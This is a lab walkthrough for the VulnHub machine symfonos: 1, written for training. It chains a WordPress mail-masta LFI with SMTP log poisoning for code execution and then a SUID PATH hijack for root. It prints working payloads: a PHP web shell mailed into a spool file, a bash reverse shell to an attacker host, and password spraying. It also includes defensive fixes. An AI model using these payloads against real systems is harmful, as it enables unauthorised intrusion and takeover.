# Machine 12 — symfonos: 1

> **Position:** 12 of 13 · **Band 3 — Easy** (global rank **062** of 708)
> **Full writeup:** [`labs/3-062-symfonos-1/README.md`](../../labs/3-062-symfonos-1/README.md)

| | |
| --- | --- |
| **Machine** | symfonos: 1 |
| **Author** | Zayotic |
| **Released** | 29 June 2019 |
| **Target** | Debian — Samba 4.5.16, Apache 2.4.25, **Postfix on :25**, WordPress 5.2.2 |
| **VulnHub** | [entry/symfonos-1,322](https://vulnhub.com/entry/symfonos-1,322/) |
| **Estimated time** | 5–8 hours |

---

## Why this machine is here

Because it contains the most instructive **chained** attack in the path: **SMTP log
poisoning**. No single bug here gives you a shell. You need *three* separate
weaknesses to line up —

1. an **LFI** in a WordPress plugin,
2. a **Postfix mailbox that is world-readable and writable by mail**, and
3. the realisation that anything you can *write into a file the LFI can read* is
   code execution.

That is the moment LFI stops being "a file read" and becomes RCE, and it is a
pattern that recurs constantly in real PHP estates (mail spools, Apache access and
error logs, SSH auth logs, `/proc/self/environ`).

It also delivers the cleanest **PATH-hijack** escalation in the path: a SUID binary
in `/opt` that runs `curl` **by bare name**.

And its first step is a lovely piece of tradecraft: an anonymous SMB share contains a
memo listing **banned passwords** — which is, functionally, a **password list**.

## Learning objectives

1. Enumerate an **anonymous (null) SMB share** and read a leaked internal memo.
2. Understand how a "banned passwords" list is an **attack asset**, and use it to
   **spray** enumerated usernames.
3. Enumerate SMB users by **RID/SID** (`enum4linux`).
4. Set up a required **hostname** in `/etc/hosts` (`symfonos.local`).
5. Enumerate WordPress **plugins aggressively** and match them to public exploits.
6. Confirm and exploit **LFI** by reading `/etc/passwd`.
7. Perform **SMTP log poisoning** end to end and explain each link in the chain.
8. Read a **world-readable, unprotected Postfix mailbox**.
9. Escalate via **PATH hijack against a SUID binary that calls `curl` by bare name**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **Anonymous SMB share leaks a password policy** | `\\target\anonymous` → **`attention.txt`** |
| Policy list used as a **password list** | banned: `epidioko`, **`qwerty`**, `baseball` |
| SMB user enumeration by SID | `enum4linux -a` → `SYMFONOS\helios` (1000), `SYMFONOS\zeus` (1001) |
| **Weak / reused SMB password** | `helios` share via **`helios : qwerty`** |
| Hidden path disclosed | the share's notes reveal WordPress at **`/h3l105`** |
| Outdated vulnerable WordPress plugins | **`mail-masta 1.0`**, **`site-editor 1.1.1`** |
| **Local File Inclusion** | `…/mail-masta/inc/campaign/count_of_send.php?pl=` |
| **SMTP log poisoning → RCE** | PHP mailed to `helios` → `/var/mail/helios` → included via `pl=` |
| **Unprotected Postfix mailbox** | `/var/mail/helios` readable and writable |
| WordPress user enumeration | `/h3l105` → `admin` |
| **SUID binary calling a bare-name command** | `/opt/statuscheck` runs `curl -I http://localhost` |

## Read first

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2**
  (SMB) and **§3** (SMTP — including the log-poisoning payload, written for this box).
- [02 — Web Attacks](../02-Web-Attacks.md) **§5** (LFI, and the **RCE primitives**
  table — mail spool is one of them) and §7 (WordPress plugins).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§7**
  (PATH hijacking) — read the whole section.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §3 (spraying).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) §1–§2.

## Before you start — answer these

1. An internal memo says "these passwords are now BANNED". Why is that a gift to an
   attacker?
2. What is **password spraying**, and how is it different from a brute-force attack?
3. You have an LFI that can read any file. What must be true about a *second* file for
   you to get code execution?
4. Where does Postfix put a local user's mail, and who can write to it?
5. `/opt/statuscheck` runs `curl -I http://localhost`. Name the vulnerability without
   looking it up.

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports **22, 25, 80, 139, 445**. Port **25** (SMTP) is unusual on a beginner box and
will matter much later — note it now and move on.

Start with SMB. Try **anonymous** access to *every* share. One of them needs no
credentials at all and contains a single text file.

Also: the site will want a **hostname**. Add it to `/etc/hosts`.
</details>

<details>
<summary><strong>Rung 2 — the memo and the share</strong></summary>

```bash
smbclient //TARGET/anonymous -N
smb: \> ls          # attention.txt
smb: \> get attention.txt
```
```text
A word to the wise...
All users are required to change their passwords.
The following passwords are now BANNED:
epidioko
qwerty
baseball
```

**A banned-password list is a password list.** Now get the usernames:

```bash
enum4linux -a TARGET
```
```text
S-1-5-21-...-1000 SYMFONOS\helios (Local User)
S-1-5-21-...-1001 SYMFONOS\zeus   (Local User)
```

Spray:

```bash
smbclient //TARGET/helios -U 'helios%qwerty'
```

Works. Inside are notes that reveal a **hidden WordPress path: `/h3l105`** and confirm
the host is `symfonos.local`. Add `TARGET symfonos.local` to `/etc/hosts` and browse
to `http://symfonos.local/h3l105/`.
</details>

<details>
<summary><strong>Rung 3 — the LFI</strong></summary>

```bash
wpscan --url http://symfonos.local/h3l105 --plugins-detection aggressive -e ap,u
```

→ plugins **`mail-masta 1.0`** and **`site-editor 1.1.1`**, both with public LFI
entries. Mail Masta's `count_of_send.php` includes a file named by `pl`:

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

You can read **any file**. Now the key question: *which file can I **write** to?*

Port 25 is **Postfix**, and local mail is delivered to **`/var/mail/<user>`**.
</details>

<details>
<summary><strong>Rung 4 — SMTP log poisoning</strong></summary>

Mail PHP to `helios`. Postfix writes your message — including your PHP — into
`/var/mail/helios`:

```bash
nc TARGET 25
EHLO attacker
MAIL FROM: attacker@kali
RCPT TO: helios
DATA
<?php system($_GET['c']); ?>
.
QUIT
```

Then include the mailbox through the LFI and pass a command:

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```

→ **RCE.** Get a real shell (check `which python` first, then use a Python reverse
shell through the `c=` parameter), and upgrade the TTY.

**Root:** `/opt/statuscheck` is SUID root and, per `strings`, runs
`curl -I http://localhost` — **bare name**:

```bash
cd /tmp
printf '/bin/sh -p\n' > curl
chmod +x curl
export PATH=/tmp:$PATH
/opt/statuscheck          # -> uid=0(root)
cat /root/proof.txt
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → **22**, **25** (Postfix smtpd), **80**, **139**, **445**.
2. Anonymous SMB share → **`attention.txt`** → banned passwords `epidioko`,
   **`qwerty`**, `baseball` — i.e. a ready-made list.
3. `enum4linux -a` → users **`helios`**, **`zeus`**.
4. **Spray:** `smbclient //TARGET/helios -U 'helios%qwerty'` → the share's notes
   disclose the hidden WordPress path **`/h3l105`**.
5. `/etc/hosts` → `symfonos.local`; `wpscan … --plugins-detection aggressive -e ap,u`
   → **`mail-masta 1.0`**, **`site-editor 1.1.1`**.
6. **LFI** at `…/count_of_send.php?pl=/etc/passwd`.
7. **SMTP log poisoning:** mail `<?php system($_GET['c']); ?>` to `helios` on port 25
   → it lands in **`/var/mail/helios`** → include via `pl=/var/mail/helios&c=id` →
   **RCE** → reverse shell as `www-data` (some builds: `helios`).
8. **SUID `/opt/statuscheck`** calls `curl` by bare name → drop `/tmp/curl`
   containing `/bin/sh -p`, `export PATH=/tmp:$PATH` → **root** →
   **`/root/proof.txt`**.
</details>

## After you finish — review questions

1. Name the **three** independent weaknesses that had to combine for the RCE. Would
   any one of them alone have given you a shell?
2. Why is a "banned passwords" memo an attack asset rather than a defensive control?
   What should the memo have said instead?
3. You sprayed 2 usernames × 3 passwords = 6 attempts. How does that compare to a
   brute force in terms of detectability?
4. Besides the mail spool, name **three other files** an LFI could include to achieve
   code execution, and what you would have to write into each.
5. Why did the poisoned mail execute as PHP when Postfix stored it as plain text?
6. `strings /opt/statuscheck` revealed the bug in seconds. What else should you always
   run `strings` on, and what are you looking for?
7. Would this PATH hijack have worked if `sudo -l` had shown a `secure_path`? Explain.
8. The WordPress install was at `/h3l105`, not `/`. Did the obscure path add security?
   Why not?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| **Anonymous SMB share** | Disable guest/anonymous access on every share; audit shares quarterly |
| Internal memo listing banned passwords | A banned list is a *hint list*. Distribute policy documents through authenticated channels only |
| `helios : qwerty` | Enforce complexity and length; check new passwords against a breached-password list; add lockout and rate limiting |
| SMB users enumerable by SID | Require SMB signing; restrict anonymous enumeration |
| **`mail-masta 1.0` / `site-editor 1.1.1` LFI** | Update or **remove** unused plugins. Subscribe to WPScan's vulnerability feed; block plugin paths at the WAF as a stopgap |
| `pl=` parameter reaching `include()` | Never build an include path from user input — use an allow-list of fixed keys |
| Hidden WordPress path `/h3l105` | Obscurity is not a control. Authenticate it or remove it |
| **Unprotected Postfix mailbox** | Restrict `/var/mail/*` permissions; disable the mailbox entirely if it is unused; consider `mail_spool_directory` hardening |
| SMTP open to the network | Bind Postfix to localhost or firewall port 25; it should not accept mail from arbitrary hosts |
| **SUID `/opt/statuscheck` calling `curl` by bare name** | Use **absolute paths** in privileged programs; set `secure_path` in `sudoers`; remove SUID if not required |
| WordPress user enumeration | Block `/?author=` and REST user endpoints |

**The single biggest lesson:** *an LFI plus any writable file equals remote code
execution.* Mail spools, web-server logs, auth logs, session files, `/tmp` — the list
of writable-and-includable files is long, and defenders routinely forget it.

---

## The commands, annotated — every input and every output

Published walkthroughs use `192.168.56.101` for the target and `192.168.56.10` for Kali. This box
requires a hostname entry before the web portion behaves.

### 1. Hostname, then two-stage scan

```bash
ip a | grep -w inet
echo "TARGET symfonos.local symfonos.localdomain" | sudo tee -a /etc/hosts
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 22,25,80,139,445 -oA scans/services TARGET
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
```

**Port 25 is the seed of the whole box.** SMTP being open is not itself a vulnerability — but it
means the machine **accepts mail and writes it to a file**, and that file is readable by an LFI.
Hold that thought; it pays off in step 6.

`ip a | grep -w inet` first, because you cannot add a hosts entry to the right subnet without
knowing your own address. `--min-rate 1000` sets a floor of probes per second, which is what
makes a 65,535-port scan take minutes instead of hours; the second scan then runs the slow
version detection and scripts on only the five ports that matter.

### 2. SMB — the anonymous share

```bash
smbclient -L //TARGET -N
smbclient //TARGET/anonymous -N
smb: \> dir
smb: \> get attention.txt
smb: \> exit
cat attention.txt
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
```
```text
  attention.txt                       N      154
```
```text
A word to the wise...
All users are required to change their passwords. The following passwords are now BANNED:
epidioko
qwerty
baseball
```

`-L … -N` lists shares with a NULL session; `-N` means "no password". Inside the share, `dir`
lists, `get` downloads, `prompt` toggles per-file confirmation, `recurse` + `mget *` fetch a
whole tree.

**Read that note as an invitation, not a warning.** The administrator published a list of
passwords that are *in use* — because you ban what people are actually using. Three candidates
and, critically, one legitimate username: the share is named **`helios`**.

### 3. Users by RID cycling, then the obvious password

```bash
enum4linux -a TARGET
```

```text
[+] Enumerating users using SID S-1-5-21-... and logon username '', password ''
 S-1-5-21-...-1000 SYMFONOS\helios (Local User)
 S-1-5-21-...-1001 SYMFONOS\zeus   (Local User)
```

`-a` runs every check enum4linux knows: users, groups, shares, password policy. The user list
came from **RID cycling** — Samba identifies accounts by a SID whose trailing number is the
**RID**; Unix users start at 1000. If an anonymous session may call `SamrLookupRids`, you can
simply ask *"who is RID 1000? 1001?"* and get usernames back. **No password, no exploit — a
misconfigured permission.**

```bash
smbclient //TARGET/helios -U 'helios%qwerty'
smb: \> dir
smb: \> get research.txt
smb: \> get todo.txt
smb: \> exit
cat todo.txt
```

```text
  research.txt                        A      432
  todo.txt                            A       52
```
```text
1. vi /etc/hosts to add symfonos.local
2. I'm working on a WordPress site at /h3l105
3. ...
```

`-U 'user%password'` — **single-quote it**, because `%` and `!` are both meaningful to an
unquoted shell. `qwerty` worked, straight off the banned list. `todo.txt` hands you the URL path
`/h3l105` and confirms the hostname trick from step 1 was the *developer's own instruction*, not
a CTF quirk.

### 4. WordPress enumeration

```bash
wpscan --url http://symfonos.local/h3l105 --plugins-detection aggressive -e ap,u
```

```text
[+] WordPress version 5.2.2 identified (Insecure)
[+] Enumerating Plugins ...
[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Version: 1.0 (100% confidence)
[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Version: 1.1.1 (80% confidence)
[i] User(s) Identified:
[+] admin
```

`-e ap,u` enumerates **all plugins** and **users**; `--plugins-detection aggressive` makes it
fingerprint plugins by requesting their known files rather than passively reading metadata.
**`(100% confidence)`** versus **`(80% confidence)`** is wpscan telling you how sure it is —
100% means it retrieved the plugin's own `readme.txt` and read the `Stable tag`.

```bash
searchsploit wordpress mail masta
searchsploit -x php/webapps/40290.txt
```

```text
WordPress Plugin Mail Masta 1.0 - Local File Inclusion | php/webapps/40290.txt
```

`-x` examines (prints) an entry without copying it. The plugin name **and version** both match,
which is what makes the entry applicable rather than merely similar. **LFI** = Local File
Inclusion: the plugin builds a filesystem path from your input and includes it.

### 5. Confirm the LFI

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
helios:x:1000:1000:helios,,,:/home/helios:/bin/bash
zeus:x:1001:1001::/home/zeus:/bin/sh
```

The plugin does `include($_GET['pl']);` — no filter at all. `/etc/passwd` prints because it
contains no `<?php` tags, so PHP emits it as literal output. Read the seven colon-separated
fields as **name : password-placeholder : UID : GID : GECOS : home : shell**; the `x` in field 2
means the real hash is in `/etc/shadow`. The `/home/helios` line confirms the account you already
authenticated to over SMB.

You can read files, but not yet run code — and here is where the two halves of this box meet.

### 6. SMTP log poisoning: LFI → RCE

**Port 25 is open, and Postfix writes delivered mail to `/var/mail/helios`.** So mail yourself a
PHP one-liner, then include your own mailbox.

```bash
nc TARGET 25
```

```text
220 symfonos.local ESMTP Postfix (Debian/GNU)
HELO attacker
250 symfonos.local
MAIL FROM: <?php system($_GET['c']); ?>
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: test
test
.
250 2.0.0 Ok: queued as 8B0F21A2
QUIT
```

SMTP is a **line-oriented text protocol**, so you can speak it by hand. Read the reply codes as
the protocol's grammar: **`220`** greeting, **`250`** success, **`354`** "start sending the
message body", and the body ends with a **line containing a single dot**. The PHP goes in
`MAIL FROM:` because that string is written verbatim into the mailbox file — which is precisely
why an unvalidated envelope field is a code-injection vector.

```bash
nc -lvnp 4444                                            # Kali, first
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**LFI + log poisoning = Remote Code Execution.** The include pulls in the mailbox, PHP finds the
`<?php … ?>` tags inside the queued `MAIL FROM` line and executes them, and `&c=` supplies the
command. (Some builds report `helios` instead of `www-data`.)

The general principle: **an LFI becomes RCE when you can make the target write a file you
control to a predictable path.** The usual primitives are mail spools, web logs (`User-Agent`
poisoning), session files, `/proc/self/environ`, and an NFS export. Always look for a writable,
predictable, includable path.

### 7. Reverse shell and TTY upgrade

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101.
www-data@symfonos:/var/www/html$
```

**URL-encoding is mandatory**: `&` separates query parameters and `>` is reserved, so sent raw the
payload is truncated at the first `&` and nothing happens — which looks like a broken shell.
`>&` sends stdout *and* stderr to the socket, `0>&1` sends stdin there too; that is what makes the
shell interactive rather than print-only. `/dev/tcp` is a **bash** feature, so check `which bash`
exists on the target first.

Upgrade immediately: `python -c 'import pty; pty.spawn("/bin/bash")'`, then `Ctrl+Z`,
`stty raw -echo; fg`, `export TERM=xterm; stty rows 40 cols 160`. Without a TTY, `Ctrl+C` kills
your *listener* and anything terminal-aware fails with `standard input must be a tty`.

Read the user flag in `/home/helios/user.txt`, then enumerate:

```bash
sudo -l; crontab -l; cat /etc/crontab; uname -r
find / -perm -u=s -type f 2>/dev/null
```

### 8. The SUID hunt finds a custom binary

```text
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/opt/statuscheck
```

`-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset* match, so SGID
files are caught too); `-type f` restricts to regular files; `2>/dev/null` discards the thousands
of permission errors that would otherwise bury the answer. Everything except **`/opt/statuscheck`**
is stock Debian — and a custom binary in `/opt` is the obvious target.

```bash
ls -l /opt/statuscheck
strings /opt/statuscheck | grep -iE 'curl|/bin|/usr'
```

```text
-rwsr-xr-x 1 root root 8632 Jun 29  2019 /opt/statuscheck
```
```text
curl -I http://localhost
```

`-rwsr-xr-x` — the **`s`** in the owner-execute position — means the SUID bit is set and the owner
is `root`: whoever runs this runs it as root. `strings` prints every run of printable characters
in a compiled binary, which usually reveals the exact command lines it hands to a shell.

**`curl` with no leading `/`.** That is the vulnerability. When a program calls another program
*by name only*, the shell searches `$PATH` left to right and runs the **first match** — so if you
control a directory earlier in `$PATH`, your file runs instead, with root's privileges.

### 9. The PATH hijack

```bash
cd /home/helios
printf '#!/bin/bash\n/bin/bash -p\n' > curl
chmod +x curl
export PATH=/home/helios:$PATH
/opt/statuscheck
id
cat /root/root.txt
```

```text
root@symfonos:~# uid=0(root) gid=0(root) groups=0(root)
```

Three steps: put an attacker-controlled directory **first** in `$PATH`; place an executable named
exactly like the bare command the privileged program calls; invoke that program. `statuscheck`
asks the shell for `curl`, the shell finds `/home/helios/curl`, and runs it as root.

**`-p` matters.** Bash deliberately drops its effective UID at startup unless invoked with `-p`
("privileged"); without it you get a `$` prompt and wrongly conclude the hijack failed. Note
`export PATH=/home/helios:$PATH` *prepends* — appending would leave `/usr/bin/curl` first and the
real one would run.

Restore afterwards: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`.

> ### 📖 The two rules that kill this whole class
>
> **Never let a SUID program resolve commands through `$PATH`.** Use absolute paths
> (`/usr/bin/curl`), and clear the environment (`env -i`, or `secure_path` in sudoers, or
> `Defaults env_reset`). Then detect: any SUID file outside a baseline should page someone.
>
> **Never leave mail spools, logs or session files includable by a web application.** The
> combination — a writable, predictable path plus an LFI — is what turned a read-only bug into
> root on this box.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 11 — Photographer: 1](11-photographer-1.md) · next: [Machine 13 — HackInOS: 1](13-hackinos-1.md) · full writeup: [`labs/3-062-symfonos-1`](../../labs/3-062-symfonos-1/README.md)._
